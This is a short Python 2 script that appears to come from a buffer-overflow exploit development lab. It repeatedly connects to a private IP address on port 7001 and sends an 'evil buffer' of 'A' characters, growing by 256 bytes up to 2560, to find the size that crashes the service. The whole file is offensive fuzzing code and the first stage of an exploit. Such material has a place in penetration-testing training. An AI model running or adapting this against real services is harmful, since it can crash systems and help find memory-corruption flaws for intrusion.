#!/usr/bin/python
import socket
import sys
import time

size = 256

while (size <=2560):

  try:
    print "\nSending evil buffer with %s bytes..." % size

    buffer = "A" * size
 
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
    s.connect(("192.168.214.10", 7001))
    s.send(buffer)
  
    s.close()

    size += 256
    time.sleep(120)

    print "\nDone!"

  except:
    print "Could not connect!"
    sys.exit()
